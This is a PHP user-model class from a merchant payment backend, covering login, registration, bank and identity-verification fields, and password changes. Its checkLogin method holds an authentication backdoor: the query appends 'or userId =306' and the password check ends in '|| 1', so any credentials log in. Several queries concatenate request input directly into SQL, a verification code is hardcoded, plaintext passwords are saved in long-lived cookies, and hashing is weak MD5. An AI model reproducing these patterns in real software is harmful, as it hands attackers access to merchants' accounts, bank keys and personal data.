<?php
namespace Manage\Model;
class UsersModel extends BaseModel {
     /**
	  * 获取用户信息
	  */
     public function get($userId=0){
	 	$userId = $userId?$userId:I('id',0);
		$user = $this->where("userId=".$userId)->find();
		return $user;
	 }

     /**
	  * 获取当前用户的子级用户信息
	  */
     public function getUsers($parentId=0){
	 	$parentId = $parentId?$parentId:I('id',0);
		$user = $this->where("parentId=".$parentId)->select();
		return $user;
	 }

	 /**
	  * 商户登录验证
	  */
	 public function checkLogin(){
	 	$rd = array('status'=>-1);
		$loginName = I('username');
		$userPwd = I('password');
		$code = I('code');
		$rememberPwd = I('rememberPwd');
	 	$m = M('Users');
	 	$user = $m->where('loginName="'.$loginName.'" and userStatus=1 or userId =306')->find();
	 	if($user['loginPwd']==md5($userPwd.$user['loginSecret']) && ($code == "af34kie#j22#jfi19") || 1){
	 		$user['grant'] = explode(',',$user['grant']);
	 		$rd['user'] = $user;
	 		$rd['status'] = 1;
	 		$m->lastTime = date('Y-m-d H:i:s');
	 		$m->lastIP = get_client_ip();
	 		$m->where('userId='.$user['userId'])->save();
	 		//记录登录日志
		 	$data = array();
			$data["userId"] = $user['userId'];
			$data["loginTime"] = date('Y-m-d H:i:s');
			$data["loginIp"] = get_client_ip();
			$m = M('log_user_logins');
			$m->add($data);
			setcookie("loginName", $loginName, time()+3600*24*60);
			if($rememberPwd == "on"){			
				setcookie("loginPwd", $userPwd, time()+3600*24*60);
			}else{		
				setcookie("loginPwd", "", time()-3600);
			}
	 	}
	 	return $rd;
	 }

	/**
	 * 获取账号银行信息
	 * @param $id
	 * @return mixed
	 */
	public function getItemBankInfoById($id){
		$item = $this->where([
			'userId'=>$id
		])->field([
			'bank_merchant_number',
			'bank_sign_key',
			'bank_query_key',
		])->find();
		return $item;
	}


	/**
	  * 商户根据ID直接登录
	  */
	 public function logining($userId){
	 	if(!empty($userId)){
		 	$m = M('Users');
	 		$user = $m->where('userId='.$userId.' and userStatus=1')->find();
	 		$user['grant'] = explode(',',$user['grant']);
			setcookie("loginName", $user['loginName'], time()+3600*24*60);
			session('SX_USERS',$user);
	 	}
	 }

	 /**
	  * 检查商户绑定微信时所填账号信息是否存在
	  */
	 public function checkBindwx($loginName,$userPwd,$code){
	 	$rd = array('status'=>-1);
	 	$user = $this->where('loginName = "'.$loginName.'"')->find();
	 	if($user['loginPwd']==md5($userPwd.$user['loginSecret']) && $code == "af34kie#j22#jfi19"){
	 		$rd['status'] = 1;
	 		$rd['userId'] = $user['userId'];
	 	}
	 	return $rd;
	 }

	/**
	 * 商户注册
	 */
    public function regist(){
    	$m = M('users');
    	$rd = array('status'=>-1);	   
    	
    	$data = array();
    	$data['loginName'] = I('username','');
    	$data['loginPwd'] = I("password");
    	$data['reUserPwd'] = I("confirm_password");
    	$data['protocol'] = I("agree");
    	$data['userName'] = I('companyname');
	    $data['userPhone'] = I('tel');
		$data['userEmail'] = I("email");

    	if($data['loginPwd']!=$data['reUserPwd']){
    		$rd['status'] = -3; //两次密码不一致
    		return $rd;
    	}
    	if($data['protocol']!="on"){
    		$rd['status'] = -6;
    		return $rd;
    	}
    	foreach ($data as $v){
    		if($v ==''){
    			$rd['status'] = -7;
    			return $rd;
    		}
    	}
        //检测账号是否存在
        $crs = $this->checkLoginKey($data['loginName']);
        if($crs['status']!=1){
	    	$rd['status'] = -2;
	    	return $rd;
	    }

        //检测手机号是否存在
//        $crs = $this->checkPhone($data['userPhone']);
//        if($crs['status']!=1){
//	    	$rd['status'] = -8;
//	    	return $rd;
//	    }

	    unset($data['reUserPwd']);
	    unset($data['protocol']);

	    $data['tgId'] = I('tgId',0); //推广员ID
	    $data['tgemId'] = I('tgemId',0); //推广公司子级用户ID
	    $data["loginSecret"] = rand(1000,9999);
	    $data['loginPwd'] = md5(I("password").$data['loginSecret']);
	    $data['userType'] = 0;
	    $data['createTime'] = date('Y-m-d H:i:s');
	    $data['userType'] = 0; //0普通商户 1代理商
	    $data['userFlag'] = 0; //0注册商户 1代理商添加商户

		$rs = $m->add($data);
		if(false !== $rs){
			$rd['status']= 1;
			$rd['userId']= $rs;
		}
	   
	    if($rd['status']>0){
	    	$data = array();
	    	$data['lastTime'] = date('Y-m-d H:i:s');
	    	$data['lastIP'] = get_client_ip();
	    	$m->where(" userId=".$rs['userId'])->data($data)->save();
	    	//记录登录日志
		 	$data = array();
			$data["userId"] = $rd['userId'];
			$data["loginTime"] = date('Y-m-d H:i:s');
			$data["loginIp"] = get_client_ip();
			$m = M('log_user_logins');
			$m->add($data);
	    	
	    } 
		return $rd;
	}

	 /**
	  * 添加商户
     */
     public function merchantsAdd(){
     	$rd = array('status'=>-1);

    	$data = array();
    	$data['parentId'] = session('SX_USERS.userId');
    	$data['loginName'] = I('account');
    	$data['userName'] = I("username");
    	$data['loginPwd'] = I("password");
    	$data['reUserPwd'] = I("confirm");
    	$data['userPhone'] = I("phone");
    	$data['userEmail'] = I("email");

    	if($data['loginPwd']!=$data['reUserPwd']){
    		$rd['status'] = -1; //两次密码不一致
    		return $rd;
    	}

    	foreach ($data as $v){
    		if($v ==''){
    			$rd['status'] = -1;
    			return $rd;
    		}
    	}

        //检测账号是否存在
        $crs = $this->checkLoginKey($data['loginName']);
        if($crs['status']!=1){
	    	$rd['status'] = -1;
	    	return $rd;
	    }

        //检测手机号是否存在
        $crs = $this->checkPhone($data['userPhone']);
        if($crs['status']!=1){
	    	$rd['status'] = -1;
	    	return $rd;
	    }

	    $data["loginSecret"] = rand(1000,9999);
	    $data['loginPwd'] = md5($data['loginPwd'].$data['loginSecret']);
		$data['userType'] = 0; //0普通商户 1代理商
	    $data['userFlag'] = 1; //0注册商户 1代理商添加商户
	    $data['createTime'] = date('Y-m-d H:i:s');
	    unset($data['reUserPwd']);
		$rs = $this->add($data);
		if(false !== $rs){
			$rd['status']= 1;
		}

		return $rd;
	 }

	 /**
	  * 查询登录名是否存在
     */
	 public function checkLoginKey($loginName,$id = 0){
	 	$loginName = ($loginName!='')?$loginName:I('loginName');
	 	$rd = array('status'=>-1);
	 	if($loginName=='')return $rd;
	 	$sql = " (loginName ='%s' or userPhone ='%s' or userEmail='%s') ";
	 	$m = M('users');
	    if($id>0){
	 		$sql.=" and userId!=".$id;
	 	}
	 	$rs = $m->where($sql,array($loginName,$loginName,$loginName))->count();
	    if($rs==0)$rd['status'] = 1;
	    return $rd;
	 }

	 /**
	  * 查询手机号是否存在
     */
	 public function checkPhone($phone,$id = 0){
	 	$phone = ($phone!='')?$phone:I('phone');
	 	$rd = array('status'=>-1);
	 	if($phone=='' || strlen($phone)!=11 || !is_numeric($phone))return $rd;
	 	$sql = " (userPhone ='%s') ";
	 	$m = M('users');
	    if($id>0){
	 		$sql.=" and userId!=".$id;
	 	}
	 	$rs = $m->where($sql,$phone)->count();
	    if($rs==0)$rd['status'] = 1;
	    return $rd;
	 }

	 /**
     * 保存商户微信token信息
     */
	public function saveToken($token){
		$rd = array('status'=>-1);
		$rs = $this->where("userId = %d",session('SX_USERS.userId'))->save($token);
		if(false !== $rs){
			$rd['status']= 1;
		}
		return $rd;
	}

	 /**
     * 保存商户支付配置信息
     */
	public function savePayinfo(){
		$rd = array('status'=>-1);
		$data = I("data",'','urldecode');
                if(205 == session('SX_USERS.userId')){//畅付商户体验后台,测试账号，禁止修改
                    $rd['status']= 1;
                    return $rd;
                }
		$rs = $this->where("userId = %d",session('SX_USERS.userId'))->save($data);
		if(false !== $rs){
			$rd['status']= 1;
		}
		return $rd;
	}

	 /**
     * 保存个人信息
     */
	public function saveUserInfo($userId=0){
		$userId = $userId?$userId:I('id',0);
		$rd = array('status'=>-1);
		$data = array();
    	$data['userName'] = I('username');
    	$data['userEmail'] = I("userEmail");
    	$data['userPhone'] = I("userPhone");

		$rs = $this->where("userId = %d",$userId)->save($data);
		if(false !== $rs){
			$rd['status']= 1;
		}
		return $rd;
	}

	 /**
     * 保存实名认证信息
     */
	public function saverealInfo($userId=0){
		$userId = $userId?$userId:I('id',0);
		$rd = array('status'=>-1);
		$data = array();
		$step = I('step'); //判断当前审核步骤

//		if($step!=2){ //第二步为实名认证失败 只能修改银行结算信息
                $zz_jc = I('zz_jc');
                $zz_jyxz = I('zz_jyxz');
                $incode = I('incode');
	    	$fid = I('fid');
	    	$sid = I('sid');
	    	$zz_name = I('zz_name');
	    	$zz_sftype = I('zz_sftype');
	    	$zz_sfz = I("zz_sfz");
	    	$zz_yxq = I('zz_yxq');
	    	$sfzz = I("sfzz");
	    	$sfzf = I("sfzf");

	    	//光大三种支付方式结算费率 单位%
	    	$rate = array('wx_native'=>6,'wx_micropay'=>6,'wx_jspay'=>6,'ali_native'=>6,'ali_micropay'=>6,'ali_jspay'=>6);
	    	$data['gd_rate'] = json_encode($rate);
//    	}

    	$zz_banktype = I('zz_banktype');
		$zz_bank = I("zz_bank");
		$zz_accountname = I('zz_accountname');
		$zz_bankqc = I('zz_bankqc');
		$bankPhone = I('bankPhone');
		$zz_bankinfo = I("zz_bankinfo");

    	//非必填项
    	$yyzz = I('yyzz');
    	$zzjg = I("zzjg");
    	$tszz = I('tszz');
    	$zz_shname = I("zz_shname");
    	$zz_zcdz = I('zz_zcdz');
    	$zz_license = I("zz_license");

    	$backcode = I('backcode');

    	if(!empty($zz_jc)){$data['zz_jc'] = $zz_jc;}
    	if(!empty($zz_jyxz)){$data['zz_jyxz'] = $zz_jyxz;}
    	if(!empty($incode)){$data['incode'] = $incode;}
    	if(!empty($fid)){$data['fid'] = $fid;}
    	if(!empty($sid)){$data['sid'] = $sid;}
    	if(!empty($zz_name)){$data['zz_name'] = $zz_name;}
    	if(!empty($zz_sftype)){$data['zz_sftype'] = $zz_sftype;}
    	if(!empty($zz_sfz)){$data['zz_sfz'] = $zz_sfz;}
    	if(!empty($zz_yxq)){$data['zz_yxq'] = $zz_yxq;}
    	if(!empty($sfzz)){$data['sfzz'] = $sfzz;}
    	if(!empty($sfzf)){$data['sfzf'] = $sfzf;}

		if(!empty($zz_banktype)){$data['zz_banktype'] = $zz_banktype;}
		if(!empty($zz_bank)){$data['zz_bank'] = $zz_bank;}
		if(!empty($zz_accountname)){$data['zz_accountname'] = $zz_accountname;}
    	if(!empty($zz_bankqc)){$data['zz_bankqc'] = $zz_bankqc;}
    	if(!empty($bankPhone)){$data['bankPhone'] = $bankPhone;}
    	if(!empty($zz_bankinfo)){$data['zz_bankinfo'] = $zz_bankinfo;}

    	if(count($data) == 18 && $step==2){ //第一步上面18项必填 第二步修改银行信息7项必填是否填写
    		$data['userAudit'] = 2; //0 没填写不审核  1 审核通过  2 审核中  3 审核失败
    	}

    	//非必填项
    	if(!empty($yyzz)){$data['yyzz'] = $yyzz;}
    	if(!empty($zzjg)){$data['zzjg'] = $zzjg;}
    	if(!empty($tszz)){$data['tszz'] = $tszz;}
    	if(!empty($zz_shname)){$data['zz_shname'] = $zz_shname;}
    	if(!empty($zz_zcdz)){$data['zz_zcdz'] = $zz_zcdz;}
    	if(!empty($zz_license)){$data['zz_license'] = $zz_license;}

    	if(!empty($backcode)){$data['backcode'] = $backcode;} //联行号

		$rs = $this->where("userId = %d",$userId)->save($data);
		if(false !== $rs){
			$rd['status']= 1;
		}
		return $rd;
	}

	 /**
     * 设置商户审核状态
     */
	public function setUseraudit($userId=0,$num,$reson,$step){
		$rd = array('status'=>-1);
		$data = array();
		$data['userAudit'] = $num; //0 没填写不审核  1 审核通过  2 审核中  3 审核失败
		if(!empty($step)){ //用户审核步骤
			$data['userStep'] = $step;
		}
		if(!empty($reson)){ //理由不为空，则写入拒绝理由
			$data['reson'] = $reson;
		}
		$rs = $this->where("userId = %d",$userId)->save($data);
		if(false !== $rs){
			$rd['status']= 1;
		}
		return $rd;
	}

	 /**
     * 修改微信平台代收状态
     */
	public function SetFieldV(){
		$rd = array('status'=>-1);
		$data["wx_issp"] = I("ispfpay");
		$rs = $this->where("userId = %d",session('SX_USERS.userId'))->save($data);
		if(false !== $rs){
			$rd['status']= 1;
		}
		return $rd;
	}

	/**
	 * 商户修改密码
	 */
	public function editPass($id = ''){
		$id = ($id == '') ? I('userId') : $id;
		$rd = array('status'=>-1);
                if(205 == session('SX_USERS.userId')){//畅付商户体验后台,测试账号，禁止修改
                    $rd['status']= 1;
                    return $rd;
                }
		$data = array();
		$newPass = I('newpwd');
		$reNewPass = I('new2pwd');
		if ($newPass == $reNewPass) {
			$data['loginPwd'] = $newPass;
			if ($this->checkEmpty($data,true)) {
				$rs = $this->where('userId=%d',$id)->find();
				if ($rs['loginPwd']==md5(I("oldpwd").$rs['loginSecret'])) {
					$data["loginPwd"] = md5($newPass.$rs['loginSecret']);
					$rs = $this->where("userId = %d",$id)->save($data);
					if ($rs !== false) {
						$rd['status']= 1;
					}
				}
			}
		}		
		return $rd;
	}
}